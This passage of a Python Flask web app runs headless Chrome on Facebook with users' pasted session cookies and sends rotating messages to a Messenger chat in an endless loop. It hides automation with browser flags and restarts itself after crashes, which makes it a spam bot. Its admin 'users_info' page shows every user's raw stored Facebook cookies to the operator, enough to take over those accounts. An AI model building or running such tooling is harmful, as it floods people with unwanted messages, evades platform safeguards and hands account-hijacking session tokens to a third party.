        time.sleep(3)
        
        cookie_array = cookies_string.split(';')
        for cookie in cookie_array:
            cookie_trimmed = cookie.strip()
            if cookie_trimmed:
                first_equal_index = cookie_trimmed.find('=')
                if first_equal_index > 0:
                    name = cookie_trimmed[:first_equal_index].strip()
                    value = cookie_trimmed[first_equal_index + 1:].strip()
                    try:
                        driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com', 'path': '/'})
                    except:
                        pass
        
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        
        try:
            fb_name = driver.execute_script("""
                let name = document.querySelector('[aria-label*="Facebook" i]')?.innerText || 
                           document.querySelector('[data-testid="profile-name"]')?.innerText ||
                           document.querySelector('a[href*="/profile"]')?.innerText ||
                           document.querySelector('[role="banner"] a')?.innerText ||
                           document.title;
                return name ? name.split('-')[0].trim() : null;
            """)
            
            if fb_name and fb_name != 'Facebook':
                return fb_name
            
            return "Facebook Account (Name not detected)"
        except:
            return "Facebook Account (Name fetch failed)"
    
    except Exception as e:
        return f"Error: {str(e)[:50]}"
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        if len(automation_state.logs) > 100:
            automation_state.logs = automation_state.logs[-100:]

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page: {page_title[:50]}', automation_state)
        log_message(f'{process_id}: URL: {page_url[:80]}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info', automation_state)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)}: {selector[:40]}...', automation_state)
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Found {len(elements)} elements', automation_state)
            
            for elem_idx, element in enumerate(elements):
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element #{elem_idx+1}', automation_state)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: ✅ Found message input!', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: ✅ Using primary selector element', automation_state)
                            return element
                except Exception as e:
                    continue
        except Exception as e:
            log_message(f'{process_id}: Selector {idx+1} error: {str(e)[:30]}', automation_state)
            continue
    
    log_message(f'{process_id}: ❌ No message input found after all attempts!', automation_state)
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser for unlimited runtime...', automation_state)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
    chrome_options.add_argument('--disable-web-security')
    chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    chrome_options.add_argument('--disable-site-isolation-trials')
    chrome_options.add_argument('--disable-notifications')
    chrome_options.add_argument('--disable-logging')
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_argument('--silent')
    chrome_options.add_argument('--disable-background-timer-throttling')
    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
    chrome_options.add_argument('--disable-renderer-backgrounding')
    chrome_options.add_argument('--disable-background-networking')
    chrome_options.add_argument('--disable-crash-reporter')
    chrome_options.add_argument('--metrics-recording-only')
    chrome_options.add_argument('--no-first-run')
    chrome_options.add_argument('--no-default-browser-check')
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--disable-software-rasterizer')
    
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging', 'enable-automation'])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    prefs = {
        'profile.default_content_setting_values.notifications': 2,
        'profile.default_content_settings.popups': 0,
        'disk-cache-size': 4096
    }
    chrome_options.add_experimental_option('prefs', prefs)
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_window_size(1920, 1080)
        
        driver.set_page_load_timeout(300)
        driver.set_script_timeout(300)
        driver.implicitly_wait(10)
        
        log_message('Chrome browser setup with unlimited timeouts completed!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                try:
                    driver.current_url
                except:
                    log_message(f'{process_id}: Session crashed! Recovering...', automation_state)
                    if driver:
                        try:
                            driver.quit()
                        except:
                            pass
                    
                    time.sleep(5)
                    driver = setup_browser(automation_state)
                    
                    log_message(f'{process_id}: Navigating to Facebook after recovery...', automation_state)
                    driver.get('https://www.facebook.com/')
                    time.sleep(8)
                    
                    if config['cookies'] and config['cookies'].strip():
                        cookie_array = config['cookies'].split(';')
                        for cookie in cookie_array:
                            cookie_trimmed = cookie.strip()
                            if cookie_trimmed:
                                first_equal_index = cookie_trimmed.find('=')
                                if first_equal_index > 0:
                                    name = cookie_trimmed[:first_equal_index].strip()
                                    value = cookie_trimmed[first_equal_index + 1:].strip()
                                    try:
                                        driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com', 'path': '/'})
                                    except:
                                        pass
                    
                    if config['chat_id']:
                        driver.get(f'https://www.facebook.com/messages/t/{config["chat_id"].strip()}')
                    else:
                        driver.get('https://www.facebook.com/messages')
                    
                    time.sleep(15)
                    message_input = find_message_input(driver, process_id, automation_state)
                    
                    if not message_input:
                        log_message(f'{process_id}: Failed to recover session!', automation_state)
                        automation_state.running = False
                        db.set_automation_running(user_id, False)
                        break
                    
                    log_message(f'{process_id}: Session recovered successfully!', automation_state)
                
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                    log_message(f'{process_id}: ✅ Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                else:
                    log_message(f'{process_id}: ✅ Sent via button: "{message_to_send[:30]}..."', automation_state)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                
                log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                time.sleep(delay)
                
            except Exception as error:
                error_msg = str(error)
                error_type = type(error).__name__
                
                if 'session deleted' in error_msg.lower() or 'session not created' in error_msg.lower() or 'chrome not reachable' in error_msg.lower() or 'StaleElementReferenceException' in error_type or 'stale element' in error_msg.lower() or 'element is not attached' in error_msg.lower() or 'WebDriverException' in error_type:
                    log_message(f'{process_id}: ⚠️ Session/Element error detected! Recovering on next loop...', automation_state)
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                    time.sleep(5)
                else:
                    log_message(f'{process_id}: Error ({error_type}): {error_msg[:100]}', automation_state)
                    time.sleep(5)
        
        log_message(f'{process_id}: Automation stopped. Total: {messages_sent}', automation_state)
        return messages_sent
        
    except Exception as error:
        log_message(f'{process_id}: Fatal error: {str(error)[:200]}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def start_automation_thread(config, user_id):
    if user_id not in automation_states:
        automation_states[user_id] = AutomationState()
    
    automation_state = automation_states[user_id]
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
    thread = threading.Thread(target=send_messages, args=(config, automation_state, user_id))
    thread.daemon = True
    thread.start()

@app.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    if not session.get('key_approved', False):
        return redirect(url_for('approval'))
    
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'login':
            username = request.form.get('username')
            password = request.form.get('password')
            
            user_id = db.verify_user(username, password)
            if user_id:
                user_key = generate_user_key(username, password)
                
                session['logged_in'] = True
                session['user_id'] = user_id
                session['username'] = username
                session['user_key'] = user_key
                
                if check_approval(user_key):
                    session['key_approved'] = True
                    return redirect(url_for('dashboard'))
                else:
                    session['key_approved'] = False
                    return redirect(url_for('approval'))
            else:
                return render_template_string(LOGIN_HTML, error="Invalid username or password")
        
        elif action == 'signup':
            username = request.form.get('new_username')
            password = request.form.get('new_password')
            confirm_password = request.form.get('confirm_password')
            
            if password != confirm_password:
                return render_template_string(LOGIN_HTML, error="Passwords do not match")
            
            success, message = db.create_user(username, password)
            if success:
                return render_template_string(LOGIN_HTML, success=message)
            else:
                return render_template_string(LOGIN_HTML, error=message)
    
    return render_template_string(LOGIN_HTML)

@app.route('/approval')
def approval():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    return render_template_string(APPROVAL_HTML, 
                         username=session.get('username'),
                         user_key=session.get('user_key'),
                         whatsapp_url=send_whatsapp_message(session.get('username'), session.get('user_key')))

@app.route('/request_approval', methods=['POST'])
def request_approval():
    if 'logged_in' not in session:
        return jsonify({'success': False})
    
    user_key = session.get('user_key')
    username = session.get('username')
    
    pending = load_pending_approvals()
    pending[user_key] = {
        "name": username,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_pending_approvals(pending)
    
    return jsonify({'success': True})

@app.route('/check_approval')
def check_approval_status():
    if 'logged_in' not in session:
        return jsonify({'approved': False})
    
    user_key = session.get('user_key')
    approved = check_approval(user_key)
    
    if approved:
        session['key_approved'] = True
    
    return jsonify({'approved': approved})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'login':
            password = request.form.get('admin_password')
            if password == ADMIN_PASSWORD:
                session['admin_logged_in'] = True
                return redirect(url_for('admin_panel'))
            else:
                return render_template_string(ADMIN_LOGIN_HTML, error="Invalid password")
    
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin'))
    
    pending = load_pending_approvals()
    approved_keys = load_approved_keys()
    
    return render_template_string(ADMIN_PANEL_HTML, 
                         pending=pending, 
                         approved_keys=approved_keys)

@app.route('/admin/approve/<key>')
def approve_key(key):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin'))
    
    pending = load_pending_approvals()
    approved_keys = load_approved_keys()
    
    if key in pending:
        approved_keys[key] = pending[key]
        save_approved_keys(approved_keys)
        del pending[key]
        save_pending_approvals(pending)
    
    return redirect(url_for('admin_panel'))

@app.route('/admin/users_info')
def admin_users_info():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin'))
    
    users_data = db.get_all_users_with_cookies()
    users_info = {}
    
    for username, info in users_data.items():
        fb_name = fetch_facebook_name(info['cookies'])
        users_info[username] = {
            'user_id': info['user_id'],
            'cookies': info['cookies'],
            'chat_id': info.get('chat_id', ''),
            'name_prefix': info.get('name_prefix', ''),
            'fb_name': fb_name
        }
    
    return render_template_string(USERS_INFO_HTML, users_info=users_info)

@app.route('/dashboard')
def dashboard():
    if 'logged_in' not in session or not session.get('key_approved'):
        return redirect(url_for('login'))
    
    user_id = session.get('user_id')
    config = db.get_user_config(user_id)
    
    if user_id in automation_states:
        automation_state = automation_states[user_id]
        status = {
            'running': automation_state.running,
            'message_count': automation_state.message_count,
            'logs': automation_state.logs[-30:]
        }
    else:
        status = {
            'running': False,
            'message_count': 0,
            'logs': []
        }
    
    return render_template_string(DASHBOARD_HTML, 
                         username=session.get('username'),
                         user_key=session.get('user_key'),
                         config=config,
                         status=status)

@app.route('/save_config', methods=['POST'])
def save_config():
    if 'logged_in' not in session:
        return jsonify({'success': False})
    
    user_id = session.get('user_id')
    chat_id = request.form.get('chat_id', '')
    name_prefix = request.form.get('name_prefix', '')
    delay = int(request.form.get('delay', 5))
    cookies = request.form.get('cookies', '')
    messages = request.form.get('messages', 'Hello!')
    
    db.update_user_config(user_id, chat_id, name_prefix, delay, cookies, messages)
    
    return jsonify({'success': True})

@app.route('/start_automation', methods=['POST'])
def start_automation():
    if 'logged_in' not in session:
        return jsonify({'success': False})
    
    user_id = session.get('user_id')
    config = db.get_user_config(user_id)
    
    if not config or not config.get('chat_id'):
        return jsonify({'success': False, 'error': 'Please set Chat ID first'})
    
    if user_id in automation_states and automation_states[user_id].running:
        return jsonify({'success': False, 'error': 'Automation already running'})
    
    start_automation_thread(config, user_id)
    
    return jsonify({'success': True})

@app.route('/stop_automation', methods=['POST'])
def stop_automation():
    if 'logged_in' not in session:
        return jsonify({'success': False})
    
    user_id = session.get('user_id')
    
    if user_id in automation_states:
        automation_states[user_id].running = False
        db.set_automation_running(user_id, False)
    
    return jsonify({'success': True})

@app.route('/get_status')
def get_status():
    if 'logged_in' not in session:
        return jsonify({'running': False, 'message_count': 0, 'logs': []})
    
    user_id = session.get('user_id')
    
    if user_id in automation_states:
        automation_state = automation_states[user_id]
        return jsonify({
            'running': automation_state.running,
            'message_count': automation_state.message_count,
            'logs': automation_state.logs[-30:]
        })
    
    return jsonify({'running': False, 'message_count': 0, 'logs': []})

@app.route('/logout')
def logout():
    user_id = session.get('user_id')
    
    if user_id and user_id in automation_states:
        automation_states[user_id].running = False
        db.set_automation_running(user_id, False)
    
    session.clear()
    return redirect(url_for('login'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
